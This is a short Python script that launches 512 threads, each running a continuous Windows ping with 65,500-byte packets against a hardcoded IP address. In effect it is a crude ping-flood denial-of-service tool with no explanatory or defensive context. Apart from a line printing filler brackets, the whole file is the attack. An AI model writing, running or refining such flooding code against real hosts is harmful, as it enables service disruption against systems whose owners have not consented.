import os
import threading
def ping():
    os.system(f"ping 136.36.175.68 -t -l 65500")
print(5000*"[]")
for i in range(512):
    thead = threading.Thread(target=ping,name=f'TH{i}')
    thead.start()
